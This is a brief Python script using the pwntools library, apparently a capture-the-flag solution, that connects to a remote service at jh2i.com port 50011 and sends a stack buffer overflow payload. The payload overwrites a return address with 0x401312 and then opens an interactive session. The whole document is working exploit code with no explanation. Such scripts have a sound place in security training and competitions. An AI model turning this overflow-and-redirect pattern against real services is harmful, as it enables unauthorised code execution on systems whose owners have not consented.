from pwn import *

r=remote("jh2i.com",50011)
#r=process("./dangerous")
pay=""
pay+='x'*(0x1e9)
pay+='x'*8
pay+=p64(0x401312)

r.sendline(pay)

r.interactive()
